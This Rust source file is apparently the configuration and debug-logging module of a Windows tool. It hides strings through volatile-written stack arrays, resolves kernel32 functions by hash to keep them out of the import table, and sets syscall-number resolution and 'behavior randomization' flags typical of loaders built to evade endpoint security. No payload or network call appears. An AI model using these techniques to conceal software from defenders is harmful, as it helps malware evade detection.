use core::ptr;
use std::sync::atomic::{AtomicI8, Ordering as AtomicOrdering};
use std::sync::OnceLock;

pub fn obfuscate_byte(b: u8) -> u8 {
    let zero: u8 = 0;
    let noise = unsafe { ptr::read_volatile(&zero) };
    b.wrapping_add(noise)
}

#[macro_export]
macro_rules! stack_str {
    ($($b:expr),+ $(,)?) => {{
        const LEN: usize = <[()]>::len(&[$( { let _ = $b; } ),+]);
        let mut buf = [0u8; LEN];
        let mut idx = 0usize;
        $(
            let v = $crate::config::obfuscate_byte($b as u8);
            unsafe { core::ptr::write_volatile(&mut buf[idx], v); }
            idx += 1;
        )+
        let _ = &idx;
        buf
    }};
}

include!(concat!(env!("OUT_DIR"), "/crypto_config.rs"));

#[cfg(debug_assertions)]
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering as AtomicOrd};
#[cfg(debug_assertions)]
use winapi::ctypes::c_void;

#[cfg(debug_assertions)]
static VERBOSE_MODE: AtomicBool = AtomicBool::new(false);
#[cfg(debug_assertions)]
static VERBOSE_CHECKED: AtomicBool = AtomicBool::new(false);
#[cfg(debug_assertions)]
static CONSOLE_ALLOCATED: AtomicBool = AtomicBool::new(false);
#[cfg(debug_assertions)]
static STDOUT_HANDLE: AtomicUsize = AtomicUsize::new(0);

#[cfg(debug_assertions)]
#[inline]
pub fn is_verbose_debug() -> bool {
    if !VERBOSE_CHECKED.load(AtomicOrd::Acquire) {
        let key = stack_str!(
            b'V', b'E', b'R', b'B', b'O', b'S', b'E', b'_', b'D', b'E', b'B', b'U', b'G'
        );
        let enabled = check_env_flag_stack(&key, false);
        VERBOSE_MODE.store(enabled, AtomicOrd::Release);
        VERBOSE_CHECKED.store(true, AtomicOrd::Release);

        if enabled {
            unsafe {
                ensure_console_allocated();
            }
        }
    }
    VERBOSE_MODE.load(AtomicOrd::Acquire)
}

#[cfg(not(debug_assertions))]
#[inline(always)]
#[allow(dead_code)]
pub fn is_verbose_debug() -> bool { false }

#[cfg(debug_assertions)]
unsafe fn ensure_console_allocated() {
    if CONSOLE_ALLOCATED.load(AtomicOrd::Acquire) {
        return;
    }

    let k32 = match crate::hash::get_module_by_hash(crate::hash::H_KERNEL32) {
        Some(h) => h,
        None => return,
    };

    type FnAllocConsole = unsafe extern "system" fn() -> i32;
    const H_ALLOC_CONSOLE: u64 = crate::hash::fnv1a_hash(b"AllocConsole");
    if let Some(f) = crate::hash::get_export_by_hash(k32, H_ALLOC_CONSOLE) {
        let alloc_console: FnAllocConsole =
            std::mem::transmute::<winapi::shared::minwindef::FARPROC, FnAllocConsole>(f);
        let _ = alloc_console();
    }

    type FnGetStdHandle = unsafe extern "system" fn(u32) -> *mut c_void;
    const H_GET_STD_HANDLE: u64 = crate::hash::fnv1a_hash(b"GetStdHandle");
    const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5;

    if let Some(f) = crate::hash::get_export_by_hash(k32, H_GET_STD_HANDLE) {
        let get_std_handle: FnGetStdHandle =
            std::mem::transmute::<winapi::shared::minwindef::FARPROC, FnGetStdHandle>(f);
        let handle = get_std_handle(STD_OUTPUT_HANDLE);
        if !handle.is_null() && handle as isize != -1 {
            STDOUT_HANDLE.store(handle as usize, AtomicOrd::Release);
        }
    }

    CONSOLE_ALLOCATED.store(true, AtomicOrd::Release);
}

#[cfg(debug_assertions)]
#[inline]
pub unsafe fn verbose_log(msg: &str) {
    if !is_verbose_debug() {
        return;
    }

    let handle = STDOUT_HANDLE.load(AtomicOrd::Acquire);
    if handle == 0 {
        return;
    }

    let k32 = match crate::hash::get_module_by_hash(crate::hash::H_KERNEL32) {
        Some(h) => h,
        None => return,
    };

    type FnWriteFile =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    const H_WRITE_FILE: u64 = crate::hash::fnv1a_hash(b"WriteFile");

    let write_file = match crate::hash::get_export_by_hash(k32, H_WRITE_FILE) {
        Some(f) => std::mem::transmute::<winapi::shared::minwindef::FARPROC, FnWriteFile>(f),
        None => return,
    };

    let mut buf = [0u8; 512];
    let len = msg.len().min(509);
    buf[..len].copy_from_slice(&msg.as_bytes()[..len]);
    buf[len] = b'\r';
    buf[len + 1] = b'\n';

    let mut written: u32 = 0;
    write_file(
        handle as *mut c_void,
        buf.as_ptr(),
        (len + 2) as u32,
        &mut written,
        std::ptr::null_mut(),
    );
}

#[macro_export]
macro_rules! verbose_dbg {
    ($($arg:tt)*) => {{
        #[cfg(debug_assertions)]
        {
            if $crate::config::is_verbose_debug() {
                let msg = format!($($arg)*);
                unsafe { $crate::config::verbose_log(&msg); }
            }
        }

    }};
}

#[macro_export]
macro_rules! debug_print {
    ($($arg:tt)*) => {{
        #[cfg(debug_assertions)]
        {
            $crate::verbose_dbg!($($arg)*);
        }

    }};
}

pub(crate) fn should_log() -> bool {
    if cfg!(debug_assertions) {
        return true;
    }

    false
}

static SSN_MODE_OVERRIDE: OnceLock<AtomicI8> = OnceLock::new();

fn ssn_mode_override_val() -> i8 {
    SSN_MODE_OVERRIDE
        .get_or_init(|| AtomicI8::new(-1))
        .load(AtomicOrdering::Acquire)
}

#[cfg(debug_assertions)]
fn parse_bool_stack(chars: &[u8]) -> Option<bool> {
    get_env_var_stack(chars).map(|v| {
        let v = v.to_ascii_lowercase();
        v == "1" || v == "true" || v == "yes"
    })
}

#[cfg(debug_assertions)]
fn parse_u32_stack(chars: &[u8]) -> Option<u32> {
    get_env_var_stack(chars).and_then(|v| v.parse::<u32>().ok())
}

#[cfg(debug_assertions)]
fn ssn_strict_base() -> bool {
    static STRICT: OnceLock<bool> = OnceLock::new();
    *STRICT.get_or_init(|| {
        let key = stack_str!(b'S', b'S', b'N', b'_', b'S', b'T', b'R', b'I', b'C', b'T');
        parse_bool_stack(&key).unwrap_or(true)
    })
}

#[cfg(debug_assertions)]
fn ssn_lenient_base() -> bool {
    static LENIENT: OnceLock<bool> = OnceLock::new();
    *LENIENT.get_or_init(|| {
        let key = stack_str!(b'S', b'S', b'N', b'_', b'L', b'E', b'N', b'I', b'E', b'N', b'T');
        parse_bool_stack(&key).unwrap_or(true)
    })
}

#[cfg(not(debug_assertions))]
#[inline(always)]
fn ssn_strict_base() -> bool { true }

#[cfg(not(debug_assertions))]
#[inline(always)]
fn ssn_lenient_base() -> bool { true }

pub(crate) fn ssn_strict() -> bool {
    match ssn_mode_override_val() {
        1 => true,
        2 => false,
        _ => ssn_strict_base(),
    }
}

pub(crate) fn ssn_lenient() -> bool {
    match ssn_mode_override_val() {
        1 => false,
        2 => true,
        _ => {
            if ssn_strict() {
                false
            } else {
                ssn_lenient_base()
            }
        }
    }
}

pub(crate) fn ssn_allow_bad_stub() -> bool {
    #[cfg(debug_assertions)]
    {
        static ALLOW: OnceLock<bool> = OnceLock::new();
        return *ALLOW.get_or_init(|| {
            let key = stack_str!(
                b'S', b'S', b'N', b'_', b'A', b'L', b'L', b'O', b'W', b'_', b'B', b'A', b'D', b'_',
                b'S', b'T', b'U', b'B'
            );
            parse_bool_stack(&key).unwrap_or(false)
        });
    }
    #[cfg(not(debug_assertions))]
    { false }
}

pub(crate) fn ssn_reset_allowed() -> bool {
    #[cfg(debug_assertions)]
    {
        static ALLOW: OnceLock<bool> = OnceLock::new();
        return *ALLOW.get_or_init(|| {
            let key = stack_str!(b'S', b'S', b'N', b'_', b'R', b'E', b'S', b'E', b'T');
            parse_bool_stack(&key).unwrap_or(true)
        });
    }
    #[cfg(not(debug_assertions))]
    { true }
}

pub(crate) fn kernel_ssn_tolerance() -> u32 {
    #[cfg(debug_assertions)]
    {
        static TOL: OnceLock<u32> = OnceLock::new();
        return *TOL.get_or_init(|| {
            let key = stack_str!(
                b'K', b'E', b'R', b'N', b'E', b'L', b'_', b'S', b'S', b'N', b'_', b'T', b'O', b'L',
                b'E', b'R', b'A', b'N', b'C', b'E'
            );
            parse_u32_stack(&key).unwrap_or(0x200)
        });
    }
    #[cfg(not(debug_assertions))]
    { 0x200 }
}

#[cfg(debug_assertions)]
fn get_env_var_stack(chars: &[u8]) -> Option<String> {
    let key = unsafe { std::str::from_utf8_unchecked(chars) };
    std::env::var(key).ok()
}

#[cfg(debug_assertions)]
fn check_env_flag_stack(chars: &[u8], default_if_set: bool) -> bool {
    if let Some(val) = get_env_var_stack(chars) {
        let v = val.to_ascii_lowercase();

        if v == "1" || v == "true" || v == "yes" {
            return true;
        }

        if default_if_set && (v == "0" || v == "false" || v == "no") {
            return false;
        }

        return false;
    }

    default_if_set
}

pub(crate) fn advanced_behavior_randomization() -> bool {
    #[cfg(debug_assertions)]
    {
        static ENABLE: OnceLock<bool> = OnceLock::new();
        return *ENABLE.get_or_init(|| {
            let key = stack_str!(
                b'A', b'D', b'V', b'A', b'N', b'C', b'E', b'D', b'_', b'R', b'A', b'N', b'D'
            );
            parse_bool_stack(&key).unwrap_or(false)
        });
    }
    #[cfg(not(debug_assertions))]
    { false }
}

